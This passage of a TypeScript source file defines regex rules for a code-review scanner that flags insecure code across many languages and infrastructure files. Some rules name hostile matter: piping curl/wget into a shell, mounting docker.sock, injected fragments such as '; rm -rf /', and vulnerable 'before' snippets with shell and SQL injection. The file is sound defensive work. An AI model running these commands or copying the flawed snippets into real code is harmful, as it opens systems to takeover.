    suggestion: "Return the error wrapped with context: return fmt.Errorf(\"loading config: %w\", err).",
  },
  {
    id: "go-discarded-error",
    category: "quality",
    severity: "low",
    confidence: 0.6,
    langs: ["go"],
    view: "code",
    pattern: /^[ \t]*_\s*(?:,\s*_\s*)?=\s*[\w.]+\s*\(/gm,
    message: (m) => `Return value explicitly discarded in ${m.ctx.short}; in Go this is usually an error.`,
    label: "Discarded return values (usually errors)",
    suggestion: "Handle or log the error. If ignoring it is deliberate, add a comment saying why.",
  },
];

const JAVA_RULES: PatternRule[] = [
  {
    id: "java-sql-concat",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["java"],
    view: "code",
    cls: "sqli",
    pattern: /\.\s*(?:executeQuery|executeUpdate|execute|prepareStatement|createQuery|createNativeQuery|addBatch)\s*\(/g,
    refine: (m) => {
      const c = callOf(m);
      return !!c && /"\s*\+\s*\w|\w\s*\+\s*"|String\s*\.\s*format\s*\(/.test(c.code) && SQL_KEYWORDS.test(c.text);
    },
    message: (m) => `SQL built by string concatenation in ${m.ctx.short}. Concatenated values can rewrite the query.`,
    suggestion: "Use PreparedStatement placeholders (?) and setString/setLong, or named parameters in JPA (:id).",
  },
  {
    id: "java-runtime-exec",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["java"],
    view: "code",
    cls: "cmdi",
    pattern: /\bRuntime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(|\bnew\s+ProcessBuilder\s*\(/g,
    refine: (m) => !literalOnly(callOf(m)?.code ?? ""),
    message: (m) => `Process started with a dynamic command in ${m.ctx.short}. If any part is user-influenced this is command injection.`,
    suggestion: "Pass a fixed executable and an argument array; validate every argument against an allowlist.",
  },
  {
    id: "java-unsafe-deserialization",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["java"],
    view: "code",
    cls: "deser",
    pattern: /\bnew\s+ObjectInputStream\s*\(|\bnew\s+XMLDecoder\s*\(|\.\s*enableDefaultTyping\s*\(/g,
    message: (m) => `Java native deserialization in ${m.ctx.short}. Deserializing untrusted bytes leads to remote code execution via gadget chains.`,
    suggestion: "Use JSON with explicit DTOs. If ObjectInputStream is unavoidable, install an ObjectInputFilter allowlist.",
  },
  {
    id: "java-xxe",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["java"],
    view: "code",
    cls: "xxe",
    pattern: /\b(?:DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory)\s*\.\s*newInstance\s*\(/g,
    refine: (m) => !/disallow-doctype-decl|FEATURE_SECURE_PROCESSING|IS_SUPPORTING_EXTERNAL_ENTITIES|external-general-entities|ACCESS_EXTERNAL_DTD/.test(m.ctx.text),
    message: (m) => `XML parser created without disabling external entities in ${m.ctx.short} (XXE: local file disclosure, SSRF).`,
    suggestion: "factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) before parsing.",
  },
  {
    id: "java-weak-crypto",
    category: "security",
    severity: "medium",
    confidence: 0.85,
    langs: ["java"],
    view: "text",
    cls: "crypto",
    pattern: /MessageDigest\s*\.\s*getInstance\s*\(\s*"(?:MD5|SHA-?1)"|Cipher\s*\.\s*getInstance\s*\(\s*"(?:DES|RC4|[^"]*\/ECB\/)/g,
    refine: (m) => (/Cipher/.test(m.text) ? { severity: "high" } : contextual(m, "high", "low")),
    message: (m) => `Weak cryptographic algorithm in ${m.ctx.short}: ${m.text.replace(/\s+/g, "")}.`,
    suggestion: "Use SHA-256+ for digests and AES/GCM/NoPadding for encryption; never ECB mode.",
  },
  {
    id: "java-trust-all",
    category: "security",
    severity: "critical",
    confidence: 0.85,
    langs: ["java"],
    view: "code",
    cls: "tls",
    pattern: /checkServerTrusted\s*\([^)]*\)\s*(?:throws\s+[\w.,\s]+)?\{\s*\}|\bNoopHostnameVerifier\b|ALLOW_ALL_HOSTNAME_VERIFIER|setHostnameVerifier\s*\(\s*\(\s*\w+\s*,\s*\w+\s*\)\s*->\s*true/g,
    message: (m) => `TLS trust or hostname verification disabled in ${m.ctx.short}. Connections accept any certificate.`,
    suggestion: "Use the default TrustManager/HostnameVerifier. Add a private CA to a custom KeyStore instead of trusting everything.",
  },
  {
    id: "java-csrf-disabled",
    category: "security",
    severity: "medium",
    confidence: 0.7,
    langs: ["java"],
    view: "code",
    pattern: /\.\s*csrf\s*\(\s*\)\s*\.\s*disable\s*\(|\.\s*csrf\s*\(\s*\w+\s*->\s*\w+\s*\.\s*disable\s*\(/g,
    message: (m) => `Spring Security CSRF protection disabled in ${m.ctx.short}. Fine for pure token-auth APIs; dangerous for cookie-session apps.`,
    suggestion: "Keep CSRF enabled for any endpoint authenticated by cookies; disable it only for stateless bearer-token APIs.",
  },
  {
    id: "java-print-stack-trace",
    category: "quality",
    severity: "low",
    confidence: 0.9,
    langs: ["java"],
    view: "code",
    pattern: /\.\s*printStackTrace\s*\(\s*\)/g,
    message: (m) => `printStackTrace() in ${m.ctx.short} writes to stderr, bypassing your logger and log levels.`,
    label: "printStackTrace() instead of structured logging",
    suggestion: "log.error(\"context\", e) with SLF4J/Logback.",
  },
];

const PHP_RULES: PatternRule[] = [
  {
    id: "php-eval",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["php"],
    view: "code",
    cls: "code",
    pattern: /\b(?:eval|assert|create_function)\s*\(/g,
    refine: (m) => !literalOnly(callOf(m)?.code ?? ""),
    message: (m) => `${m.text.replace(/\s*\($/, "")}() on a dynamic value in ${m.ctx.short} — remote code execution if user-influenced.`,
    suggestion: "Remove dynamic code evaluation; use an explicit dispatch table.",
  },
  {
    id: "php-command-exec",
    category: "security",
    severity: "high",
    confidence: 0.7,
    langs: ["php"],
    view: "code",
    cls: "cmdi",
    pattern: /\b(?:system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(/g,
    refine: (m) => !literalOnly(callOf(m)?.code ?? "") && !/escapeshellarg/.test(callOf(m)?.code ?? ""),
    message: (m) => `Shell command with dynamic input in ${m.ctx.short}.`,
    suggestion: "Avoid the shell; if unavoidable, wrap every argument in escapeshellarg().",
  },
  {
    id: "php-unserialize",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["php"],
    view: "code",
    cls: "deser",
    pattern: /\bunserialize\s*\(/g,
    refine: (m) => !/allowed_classes\s*=>\s*false/.test(m.ctx.text.slice(m.index, m.index + 200)),
    message: (m) => `unserialize() in ${m.ctx.short}. Untrusted input triggers PHP object injection (POP chains → RCE).`,
    suggestion: "Use json_decode(). If unserialize is required: unserialize($data, ['allowed_classes' => false]).",
  },
  {
    id: "php-dynamic-include",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["php"],
    view: "code",
    cls: "lfi",
    pattern: /\b(?:include|include_once|require|require_once)\b\s*\(?\s*\$/g,
    message: (m) => `include/require with a variable path in ${m.ctx.short} (local/remote file inclusion).`,
    suggestion: "Map user choices to a fixed allowlist of files instead of building paths from input.",
  },
  {
    id: "php-sql-concat",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["php"],
    view: "text",
    cls: "sqli",
    pattern: /\b(?:mysqli_query|mysql_query|pg_query)\s*\(|->\s*(?:query|exec)\s*\(/g,
    refine: (m) => {
      const c = callOf(m);
      return !!c && /"[^"]*\$\w|\.\s*\$\w|\$\w+\s*\./.test(c.text) && SQL_KEYWORDS.test(c.text);
    },
    message: (m) => `SQL with interpolated/concatenated variables in ${m.ctx.short}.`,
    suggestion: "Use PDO prepared statements: $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);",
  },
  {
    id: "php-echo-request",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["php"],
    view: "code",
    cls: "xss",
    pattern: /\b(?:echo|print)\b[^;]*\$_(?:GET|POST|REQUEST|COOKIE)\b/g,
    refine: (m) => !/htmlspecialchars|htmlentities|intval/.test(m.text),
    message: (m) => `Request data echoed without escaping in ${m.ctx.short} (reflected XSS).`,
    suggestion: "Escape on output: echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8');",
  },
  {
    id: "php-extract-request",
    category: "security",
    severity: "high",
    confidence: 0.9,
    langs: ["php"],
    view: "code",
    pattern: /\bextract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)\b/g,
    message: (m) => `extract() on request data in ${m.ctx.short} lets clients overwrite any local variable.`,
    suggestion: "Read the specific keys you need from $_POST and validate them.",
  },
];

const RUBY_RULES: PatternRule[] = [
  {
    id: "rb-sql-interpolation",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["rb"],
    view: "text",
    cls: "sqli",
    pattern: /\.\s*(?:where|find_by_sql|order|group|having|joins|select|pluck|exists\?|update_all|delete_all|count_by_sql|calculate)\s*\(?\s*"[^"\n]*#\{/g,
    message: (m) => `String interpolation inside an ActiveRecord query in ${m.ctx.short} (SQL injection).`,
    suggestion: "Use bound parameters: User.where(\"email = ?\", email) or hash conditions: User.where(email: email).",
  },
  {
    id: "rb-command-interpolation",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["rb"],
    view: "text",
    cls: "cmdi",
    pattern: /(?:\bsystem|\bexec|\bspawn|IO\s*\.\s*popen|Open3\s*\.\s*\w+|%x)\s*[([{]?\s*"[^"\n]*#\{|`[^`\n]*#\{/g,
    message: (m) => `Shell command with interpolated values in ${m.ctx.short}.`,
    suggestion: "Pass arguments separately so no shell is involved: system(\"git\", \"clone\", url).",
  },
  {
    id: "rb-dynamic-dispatch",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["rb"],
    view: "code",
    cls: "code",
    pattern: /\.\s*(?:send|public_send|constantize|safe_constantize)\s*\(?\s*params\b|\b(?:eval|instance_eval|class_eval)\s*\(?\s*params\b/g,
    message: (m) => `Request parameters drive dynamic dispatch/eval in ${m.ctx.short} — callers can invoke arbitrary methods or classes.`,
    suggestion: "Map allowed values to methods explicitly (case/when or a frozen hash).",
  },
  {
    id: "rb-unsafe-load",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["rb"],
    view: "code",
    cls: "deser",
    pattern: /\bMarshal\s*\.\s*(?:load|restore)\s*\(|\b(?:YAML|Psych)\s*\.\s*unsafe_load\s*\(/g,
    message: (m) => `Unsafe deserialization in ${m.ctx.short} (Marshal/YAML object construction → RCE on untrusted input).`,
    suggestion: "Use JSON, or YAML.safe_load with permitted_classes.",
  },
  {
    id: "rb-permit-all",
    category: "security",
    severity: "high",
    confidence: 0.9,
    langs: ["rb"],
    view: "code",
    cls: "mass-assign",
    pattern: /\bparams\s*\.\s*permit!\b/g,
    message: (m) => `params.permit! in ${m.ctx.short} allows mass assignment of every attribute (role, admin, owner_id…).`,
    suggestion: "Permit explicit attributes: params.require(:user).permit(:name, :email).",
  },
  {
    id: "rb-html-safe",
    category: "security",
    severity: "medium",
    confidence: 0.65,
    langs: ["rb"],
    view: "code",
    cls: "xss",
    pattern: /\.\s*html_safe\b|\braw\s*\(/g,
    refine: (m) => (/params|request\./.test(m.lineText) ? { severity: "high", confidence: 0.85 } : true),
    message: (m) => `Output marked html_safe/raw in ${m.ctx.short} bypasses Rails auto-escaping.`,
    suggestion: "Let Rails escape by default; for rich text use sanitize(html, tags: [...]).",
  },
];

const CS_RS_RULES: PatternRule[] = [
  {
    id: "cs-sql-concat",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["cs"],
    view: "text",
    cls: "sqli",
    pattern: /\bnew\s+SqlCommand\s*\(\s*(?:\$"|"[^"\n]*"\s*\+)|\.\s*(?:FromSqlRaw|ExecuteSqlRaw)\s*\(\s*(?:\$"|"[^"\n]*"\s*\+)/g,
    message: (m) => `SQL built with interpolation/concatenation in ${m.ctx.short}.`,
    suggestion: "Use SqlParameter / FromSqlInterpolated (which parameterizes) instead of FromSqlRaw with concatenation.",
  },
  {
    id: "cs-tls-bypass",
    category: "security",
    severity: "critical",
    confidence: 0.9,
    langs: ["cs"],
    view: "code",
    cls: "tls",
    pattern: /\bServer(?:Certificate)?(?:Custom)?ValidationCallback\s*=\s*[^;]*=>\s*true\b|DangerousAcceptAnyServerCertificateValidator/g,
    message: (m) => `Server certificate validation bypassed in ${m.ctx.short}.`,
    suggestion: "Remove the callback; trust a private CA through the OS/certificate store instead.",
  },
  {
    id: "cs-binaryformatter",
    category: "security",
    severity: "high",
    confidence: 0.9,
    langs: ["cs"],
    view: "code",
    cls: "deser",
    pattern: /\bnew\s+(?:BinaryFormatter|NetDataContractSerializer|SoapFormatter|LosFormatter)\s*\(/g,
    message: (m) => `${m.text.replace(/new\s+|\s*\(/g, "")} in ${m.ctx.short} is unsafe for any untrusted input (RCE) and obsolete in .NET 8+.`,
    suggestion: "Use System.Text.Json with explicit types.",
  },
  {
    id: "rs-tls-insecure",
    category: "security",
    severity: "critical",
    confidence: 0.9,
    langs: ["rs"],
    view: "code",
    cls: "tls",
    pattern: /\bdanger_accept_invalid_(?:certs|hostnames)\s*\(\s*true\s*\)|\.\s*dangerous\s*\(\s*\)\s*\.\s*set_certificate_verifier/g,
    message: (m) => `TLS verification disabled in ${m.ctx.short}.`,
    suggestion: "Remove danger_accept_invalid_*; add a private root certificate with add_root_certificate() instead.",
  },
];

export const LANGUAGE_RULES: PatternRule[] = [...PY_RULES, ...GO_RULES, ...JAVA_RULES, ...PHP_RULES, ...RUBY_RULES, ...CS_RS_RULES];

const WORKFLOW_FILE = /(?:^|\/)\.github\/workflows\/[^/]+\.ya?ml$/;

export const INFRA_RULES: PatternRule[] = [
  {
    id: "docker-unpinned-base",
    category: "security",
    severity: "low",
    confidence: 0.85,
    langs: ["docker"],
    view: "code",
    pattern: /^[ \t]*FROM\s+(?:--platform=\S+\s+)?(\S+)/gim,
    refine: (m) => {
      const image = (m.groups[0] ?? "").toLowerCase();
      if (image === "scratch" || image.includes("@sha256:") || image.includes("$")) return false;
      const stages = [...m.ctx.code.matchAll(/\bAS\s+([\w.-]+)/gi)].map((s) => s[1].toLowerCase());
      if (stages.includes(image)) return false;
      const tag = /:([^/:]+)$/.exec(image)?.[1];
      return !tag || tag === "latest";
    },
    message: (m) => `Base image \`${m.groups[0]}\` in ${m.ctx.short} is not pinned to a version${/:latest$/i.test(m.groups[0] ?? "") ? " (`:latest`)" : ""}. Builds silently change underneath you and supply-chain changes go unnoticed.`,
    suggestion: "Pin a specific tag (node:22.11-alpine) — ideally plus a digest (@sha256:…) — and update it deliberately (Dependabot/Renovate can do this).",
  },
  {
    id: "remote-script-pipe-shell",
    category: "security",
    severity: "medium",
    confidence: 0.85,
    langs: ["docker", "shell", "yaml"],
    view: "code",
    pattern: /\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b/g,
    message: (m) => `Remote script piped straight into a shell in ${m.ctx.short}. A compromised or MITM'd download runs with full build privileges, and the build is not reproducible.`,
    suggestion: "Download to a file, verify a pinned checksum (sha256sum -c), then execute — or install from a package manager.",
  },
  {
    id: "docker-add-remote",
    category: "security",
    severity: "medium",
    confidence: 0.8,
    langs: ["docker"],
    view: "code",
    pattern: /^[ \t]*ADD\s+(?:--\S+\s+)*https?:\/\//gim,
    message: (m) => `ADD with a remote URL in ${m.ctx.short} fetches unverified content at build time.`,
    suggestion: "Use ADD --checksum=sha256:… (BuildKit) or RUN curl + checksum verification.",
  },
  {
    id: "docker-secret-in-env",
    category: "security",
    severity: "high",
    confidence: 0.75,
    langs: ["docker"],
    view: "code",
    cls: "secret",
    pattern: /^[ \t]*(ENV|ARG)\s+([A-Z0-9_]*(?:SECRET|PASSWORD|PASSWD|TOKEN|API_KEY|PRIVATE_KEY|ACCESS_KEY)[A-Z0-9_]*)(?:[ \t]*=[ \t]*|[ \t]+)?(\S*)/gim,
    refine: (m) => {
      const value = m.groups[2] ?? "";
      if (/^ENV$/i.test(m.groups[0] ?? "")) return value !== "" && !/^\$/.test(value);
      return { severity: "medium", confidence: 0.7 };
    },
    message: (m) =>
      /ENV/i.test(m.groups[0] ?? "")
        ? `Secret \`${m.groups[1]}\` baked into the image with ENV in ${m.ctx.short}. Anyone who can pull the image can read it (docker inspect / image layers).`
        : `Secret \`${m.groups[1]}\` passed as a build ARG in ${m.ctx.short}. Build args are recorded in the image history.`,
    suggestion: "Use BuildKit secrets (RUN --mount=type=secret,id=npm_token …) for build-time secrets and inject runtime secrets via the orchestrator.",
  },
  {
    id: "chmod-777",
    category: "security",
    severity: "medium",
    confidence: 0.85,
    langs: ["docker", "shell", "yaml"],
    view: "code",
    pattern: /\bchmod\s+(?:-R\s+)?(?:0?777|a\+rwx)\b/g,
    message: (m) => `chmod 777 in ${m.ctx.short} makes files world-writable — any process or user can modify them.`,
    suggestion: "Grant the minimum: chown to the app user and chmod 755 (dirs) / 644 (files).",
  },
  {
    id: "container-privileged",
    category: "security",
    severity: "high",
    confidence: 0.9,
    langs: ["yaml"],
    view: "code",
    pattern: /^\s*(?:privileged\s*:\s*true|allowPrivilegeEscalation\s*:\s*true)\b/gim,
    message: (m) => `Privileged container in ${m.ctx.short}. A privileged container can trivially escape to the host.`,
    suggestion: "Remove privileged mode; grant only the specific capabilities needed (cap_add) and set allowPrivilegeEscalation: false.",
  },
  {
    id: "container-docker-socket",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["yaml", "docker"],
    view: "code",
    pattern: /\/var\/run\/docker\.sock/g,
    message: (m) => `Docker socket mounted in ${m.ctx.short}. Access to docker.sock is equivalent to root on the host.`,
    suggestion: "Avoid mounting the socket; use a rootless builder or a socket proxy with a restricted API allowlist.",
  },
  {
    id: "container-host-namespaces",
    category: "security",
    severity: "medium",
    confidence: 0.85,
    langs: ["yaml"],
    view: "code",
    pattern: /^\s*(?:network_mode\s*:\s*["']?host|hostNetwork\s*:\s*true|hostPID\s*:\s*true|hostIPC\s*:\s*true|runAsUser\s*:\s*0\b)/gim,
    message: (m) => `Container shares host namespaces or runs as root (${m.text.trim()}) in ${m.ctx.short}.`,
    suggestion: "Use isolated networking and run as a non-root UID (runAsNonRoot: true).",
  },
  {
    id: "gha-unpinned-action",
    category: "security",
    severity: "low",
    confidence: 0.9,
    langs: ["yaml"],
    view: "code",
    files: WORKFLOW_FILE,
    pattern: /^\s*-?\s*uses\s*:\s*["']?([\w.-]+)\/([\w./-]+)@([\w.-]+)/gm,
    refine: (m) => !/^(?:actions|github)$/i.test(m.groups[0] ?? "") && !/^[0-9a-f]{40}$/.test(m.groups[2] ?? ""),
    message: (m) => `Third-party action \`${m.groups[0]}/${m.groups[1]}@${m.groups[2]}\` in ${m.ctx.short} is pinned to a mutable tag. If that tag is moved (as in the tj-actions compromise), your workflow runs the attacker's code with your secrets.`,
    suggestion: "Pin third-party actions to a full commit SHA (uses: owner/action@<40-char-sha> # v1.2.3) and let Dependabot bump it.",
  },
  {
    id: "gha-write-all",
    category: "security",
    severity: "medium",
    confidence: 0.9,
    langs: ["yaml"],
    view: "code",
    files: WORKFLOW_FILE,
    pattern: /^\s*permissions\s*:\s*write-all\b/gm,
    message: (m) => `permissions: write-all in ${m.ctx.short} gives every step a token that can push code, edit releases and change settings.`,
    suggestion: "Default to permissions: contents: read and grant write scopes per job only where needed.",
  },
  {
    id: "gha-secret-echo",
    category: "security",
    severity: "medium",
    confidence: 0.7,
    langs: ["yaml"],
    view: "code",
    files: WORKFLOW_FILE,
    pattern: /\b(?:echo|printf|cat)\b[^\n]*\$\{\{\s*secrets\./g,
    message: (m) => `Secret written to the job log in ${m.ctx.short}. Masking only catches the exact value — any transformation (base64, substring, JSON) leaks it.`,
    suggestion: "Pass secrets through env: and never print them. Write them to files with umask 077 if a tool needs a file.",
  },
  {
    id: "gha-insecure-commands",
    category: "security",
    severity: "high",
    confidence: 0.95,
    langs: ["yaml"],
    view: "code",
    files: WORKFLOW_FILE,
    pattern: /ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*["']?true/gi,
    message: (m) => `ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables the deprecated set-env/add-path commands in ${m.ctx.short}, which allow environment injection from log output.`,
    suggestion: "Remove it and write to $GITHUB_ENV / $GITHUB_PATH instead.",
  },
  {
    id: "tf-public-ingress",
    category: "security",
    severity: "medium",
    confidence: 0.8,
    langs: ["tf"],
    view: "text",
    pattern: /\b(?:cidr_blocks|ipv6_cidr_blocks)\s*=\s*\[[^\]]*"(?:0\.0\.0\.0\/0|::\/0)"|\bsource_address_prefix\s*=\s*"(?:\*|0\.0\.0\.0\/0|Internet)"/g,
    refine: (m) => {
      const before = m.ctx.text.slice(Math.max(0, m.index - 600), m.index);
      if (before.lastIndexOf("egress") > before.lastIndexOf("ingress")) return false;
      const block = m.ctx.text.slice(Math.max(0, m.index - 400), m.index + 400);
      return /\b(?:from_port|port|destination_port_range)\s*=\s*"?(?:22|3389|3306|5432|1433|1521|6379|27017|9200|5601|11211|2375)\b/.test(block)
        ? { severity: "high", confidence: 0.9 }
        : true;
    },
    message: (m) => `Ingress open to the entire internet (0.0.0.0/0) in ${m.ctx.short}.`,
    suggestion: "Restrict to known CIDRs or a bastion/VPN; never expose SSH, RDP or database ports publicly.",
  },
  {
    id: "tf-public-database",
    category: "security",
    severity: "high",
    confidence: 0.9,
    langs: ["tf"],
    view: "code",
    pattern: /\bpublicly_accessible\s*=\s*true\b/g,
    message: (m) => `Database marked publicly_accessible in ${m.ctx.short}.`,
    suggestion: "Keep databases in private subnets; reach them through the application tier or a bastion.",
  },
  {
    id: "tf-encryption-disabled",
    category: "security",
    severity: "medium",
    confidence: 0.85,
    langs: ["tf"],
    view: "code",
    pattern: /\b(?:encrypted|storage_encrypted|encryption_enabled|enable_encryption|kms_encryption_enabled)\s*=\s*false\b/g,
    message: (m) => `Encryption at rest explicitly disabled in ${m.ctx.short}.`,
    suggestion: "Set encryption to true (with a customer-managed KMS key where compliance requires it).",
  },
  {
    id: "tf-iam-wildcard",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["tf", "json"],
    view: "text",
    pattern: /"Action"\s*:\s*"\*"|\bactions\s*=\s*\[\s*"\*"\s*\]/g,
    message: (m) => `IAM policy grants every action ("*") in ${m.ctx.short}.`,
    suggestion: "List the specific actions the workload needs (least privilege); use IAM Access Analyzer to generate a policy from usage.",
  },
];

const CLIENT_ONLY = (m: RuleMatch): boolean => m.ctx.isClient;

export const JS_EXTRA_RULES: PatternRule[] = [
  {
    id: "js-new-function",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["js"],
    view: "code",
    cls: "code",
    pattern: /\bnew\s+Function\s*\(/g,
    refine: (m) => !literalOnly(callOf(m)?.code ?? ""),
    message: (m) => `\`new Function()\` with dynamic source in ${m.ctx.short}. It is eval() under another name.`,
    suggestion: "Replace with a lookup table or a proper parser; never compile strings into code.",
  },
  {
    id: "js-document-write",
    category: "security",
    severity: "medium",
    confidence: 0.8,
    langs: ["js"],
    view: "code",
    cls: "xss",
    pattern: /\bdocument\s*\.\s*write(?:ln)?\s*\(/g,
    refine: (m) => !literalOnly(callOf(m)?.code ?? ""),
    message: (m) => `document.write() with dynamic content in ${m.ctx.short} writes raw HTML (XSS) and blocks parsing.`,
    suggestion: "Create elements with document.createElement and set textContent.",
  },
  {
    id: "js-vm-sandbox",
    category: "security",
    severity: "high",
    confidence: 0.8,
    langs: ["js"],
    view: "code",
    cls: "code",
    pattern: /\bvm\s*\.\s*(?:runInNewContext|runInThisContext|runInContext|compileFunction)\s*\(|\bnew\s+vm\s*\.\s*Script\s*\(/g,
    message: (m) => `node:vm used to run code in ${m.ctx.short}. The vm module is not a security boundary — sandboxed code can escape to the host process.`,
    suggestion: "Never run untrusted code in-process. Use isolated-vm, a separate process with no privileges, or a WebAssembly sandbox.",
  },
  {
    id: "js-shell-template",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["js"],
    view: "text",
    cls: "cmdi",
    pattern: /(?:(?<![.\w$])|\b(?:child_process|childProcess|cp)\s*\.\s*)(?:exec|execSync)\s*\(\s*`[^`]*\$\{/g,
    message: (m) => `Shell command assembled with a template literal in ${m.ctx.short}. Interpolated values are parsed by the shell (\`; rm -rf /\`, \`$(…)\`).`,
    suggestion: "Use execFile/spawn with an argument array (no shell) and validate inputs: execFile(\"git\", [\"clone\", \"--\", url]).",
    fix: {
      before: "exec(`git clone ${repoUrl}`, cb);",
      after: 'execFile("git", ["clone", "--", repoUrl], cb);',
      language: "typescript",
    },
  },
  {
    id: "prisma-raw-unsafe",
    category: "security",
    severity: "high",
    confidence: 0.9,
    langs: ["js"],
    view: "text",
    cls: "sqli",
    pattern: /\$(?:queryRawUnsafe|executeRawUnsafe)\s*\(\s*(?:`[^`]*\$\{|["'][^"'\n]*["']\s*\+)|\bPrisma\s*\.\s*raw\s*\(\s*`[^`]*\$\{/g,
    message: (m) => `Interpolated SQL passed to ${/Prisma\s*\.\s*raw/.test(m.text) ? "Prisma.raw()" : "$queryRawUnsafe/$executeRawUnsafe"} in ${m.ctx.short}. These APIs do not parameterize — interpolated values are injected verbatim.`,
    suggestion: "Use the tagged template form, which parameterizes automatically: prisma.$queryRaw`SELECT * FROM users WHERE id = ${id}`. Pass extra values to *Unsafe variants as positional parameters ($1, $2).",
    fix: {
      before: "await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`);",
      after: "await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`;\n// or: await prisma.$queryRawUnsafe(\"SELECT * FROM users WHERE email = $1\", email);",
      language: "typescript",
    },
  },
  {
    id: "cors-credentials-any-origin",
    category: "security",
    severity: "high",
    confidence: 0.85,
    langs: ["js"],
    view: "text",
    cls: "cors",
    pattern: /\borigin\s*:\s*(?:true|["']\*["'])[\s\S]{0,200}?\bcredentials\s*:\s*true|\bcredentials\s*:\s*true[\s\S]{0,200}?\borigin\s*:\s*(?:true|["']\*["'])/g,
    message: (m) => `CORS reflects any origin while allowing credentials in ${m.ctx.short}. Any website can make authenticated requests with your users' cookies and read the responses.`,
    suggestion: "Use an explicit origin allowlist when credentials are enabled: origin: [\"https://app.example.com\"].",
  },
  {
    id: "jwt-verify-no-algorithms",
    category: "security",
    severity: "low",
    confidence: 0.6,
    langs: ["js"],
    view: "code",
    cls: "auth",
    pattern: /\bjwt\s*\.\s*verify\s*\(/g,
    refine: (m) => {
      const c = callOf(m);
      return !!c && (c.args.length < 3 || !/\balgorithms\b/.test(c.args[2]));
    },
    message: (m) => `jwt.verify() without an explicit \`algorithms\` allowlist in ${m.ctx.short}. Older jsonwebtoken versions are open to algorithm-confusion attacks.`,
    suggestion: "Pin the algorithm: jwt.verify(token, key, { algorithms: [\"HS256\"] }) and keep jsonwebtoken ≥ 9.",
  },
  {
    id: "postmessage-any-target",
    category: "security",
    severity: "medium",
    confidence: 0.75,
    langs: ["js"],
    view: "text",
    pattern: /\.\s*postMessage\s*\([^)]*,\s*["']\*["']\s*\)/g,
    message: (m) => `postMessage(…, "*") in ${m.ctx.short} sends the data to whatever origin currently occupies the target window.`,
    suggestion: "Pass the exact target origin: target.postMessage(data, \"https://partner.example.com\").",
  },
  {
    id: "settimeout-string",
    category: "security",
    severity: "medium",
    confidence: 0.85,
    langs: ["js"],
    view: "text",
    cls: "code",
    pattern: /\bset(?:Timeout|Interval)\s*\(\s*["'`]/g,
    message: (m) => `String passed to ${m.text.includes("Interval") ? "setInterval" : "setTimeout"} in ${m.ctx.short} — it is evaluated like eval().`,
    suggestion: "Pass a function: setTimeout(() => doThing(id), 100).",
  },
  {
    id: "insecure-websocket",
    category: "security",
    severity: "medium",
    confidence: 0.8,
    langs: ["js"],
    view: "text",
    pattern: /\bnew\s+WebSocket\s*\(\s*["'`]ws:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0)/g,
    message: (m) => `Unencrypted ws:// WebSocket in ${m.ctx.short}. Messages (and any tokens in them) travel in clear text.`,
    suggestion: "Use wss:// in every non-local environment.",
  },
  {
    id: "react-random-key",
    category: "quality",
    severity: "medium",
    confidence: 0.95,
    langs: ["js"],
    view: "code",
    pattern: /\bkey\s*=\s*\{\s*(?:Math\s*\.\s*random|crypto\s*\.\s*randomUUID|Date\s*\.\s*now|uuid\w*|nanoid)\s*\(/g,
    message: (m) => `React key generated randomly at render time in ${m.ctx.short}. Every render remounts the element — state, focus and animations are lost.`,
    label: "Random React keys remount elements on every render",
    suggestion: "Use a stable id from the data (item.id), generated once when the item is created.",
  },
  {
    id: "useeffect-async-callback",
    category: "quality",
    severity: "medium",
    confidence: 0.95,
    langs: ["js"],
    view: "code",
    pattern: /\buse(?:Layout)?Effect\s*\(\s*async\b/g,
    message: (m) => `Async function passed directly to useEffect in ${m.ctx.short}. React treats the returned promise as a cleanup function, so cleanup never runs and errors go unhandled.`,
    label: "Async functions passed directly to useEffect",
    suggestion: "Define the async function inside the effect and call it: useEffect(() => { void load(); }, [deps]);",
    fix: {
      before: "useEffect(async () => {\n  const data = await fetchData();\n  setData(data);\n}, []);",
      after: "useEffect(() => {\n  let cancelled = false;\n  (async () => {\n    const data = await fetchData();\n    if (!cancelled) setData(data);\n  })().catch(console.error);\n  return () => { cancelled = true; };\n}, []);",
      language: "tsx",
    },
  },
  {
    id: "client-secret-storage",
    category: "security",
    severity: "medium",
    confidence: 0.7,
    langs: ["js"],
    view: "text",
    pattern: /\b(?:localStorage|sessionStorage)\s*\.\s*setItem\s*\(\s*["'`][^"'`]*(?:password|secret|private[_-]?key|api[_-]?key)[^"'`]*["'`]/gi,
    refine: CLIENT_ONLY,
    message: (m) => `Sensitive value stored in web storage in ${m.ctx.short}. Any script on the page (including one injected via XSS or a compromised dependency) can read it.`,
    suggestion: "Keep secrets server-side; use httpOnly cookies for session material.",
  },
];

